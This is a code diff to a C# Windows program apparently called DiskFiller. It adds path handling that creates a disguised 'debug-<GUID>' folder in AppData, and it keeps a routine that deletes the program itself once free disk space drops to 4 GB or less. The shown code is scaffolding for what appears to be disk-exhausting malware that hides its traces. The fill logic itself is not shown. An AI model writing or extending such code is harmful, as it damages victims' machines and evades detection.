@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Diagnostics;
 using System.Windows.Forms;
 
@@ -9,16 +10,34 @@ namespace DiskFiller
 {
     internal partial class DiskFiller : Form
     {
+        internal struct ApplicationPaths
+        {
+            internal string appdata;
+            internal string currentFolder;
+            internal string currentFullPath;
+            internal string diskFillerFolder;
+        }
+
+
+
+        private readonly string applicationName = string.Empty;
+        private readonly ApplicationPaths finalPaths;
+
+
+
         internal DiskFiller()
         {
-            if (GetDiskSpace(@"C:\") <= 4)
+            // Check if application should run
+            if (GetFreeDiskSpace(@"C:\") <= 4)
             {
                 DestroySelf();
             }
-            
 
 
-            // Define all needed variables
+
+            finalPaths = GetApplicationPaths();
+
+            applicationName = finalPaths.currentFullPath.Replace(finalPaths.currentFolder, string.Empty).Substring(1);
 
 
 
@@ -40,11 +59,16 @@ namespace DiskFiller
             InitializeComponent();
         }
 
+
+
         /// <summary>
-        /// Returns disk space of the given disk in GB
-        /// Example for a disk name -> "C:\"
+        /// Gets the free space of a disk with a given name
         /// </summary>
-        private double GetDiskSpace(string diskName)
+        /// 
+        /// <returns>
+        /// The free disk space in gb
+        /// </returns>
+        private double GetFreeDiskSpace(string diskName)
         {
             foreach (DriveInfo drive in DriveInfo.GetDrives())
             {
@@ -56,6 +80,8 @@ namespace DiskFiller
 
             return -1;
         }
+
+
 
         /// <summary>
         /// Delete application in 1 second and close the process in the meantime
@@ -78,6 +104,32 @@ namespace DiskFiller
             }
 
             Environment.Exit(0);
+        }
+
+
+
+        /// <summary>
+        /// Gets all the needed folder paths and the current file name for further purpose
+        /// </summary>
+        /// 
+        /// <returns>
+        /// A struct which is defined at the beginning of the file but with all the values filled
+        /// </returns>
+        private ApplicationPaths GetApplicationPaths()
+        {
+            ApplicationPaths appPaths = new ApplicationPaths()
+            {
+                appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                currentFullPath = Application.ExecutablePath
+            };
+
+            string currentFullPath = appPaths.currentFullPath;
+
+            appPaths.diskFillerFolder = $@"{appPaths.appdata}\debug-{Guid.NewGuid()}";
+            appPaths.currentFolder = currentFullPath.Replace(currentFullPath.Split(Convert.ToChar(@"\")).Last(), string.Empty);
+            appPaths.currentFolder = appPaths.currentFolder.Substring(0, appPaths.currentFolder.Length - 1);
+
+            return appPaths;
         }
     }
 }
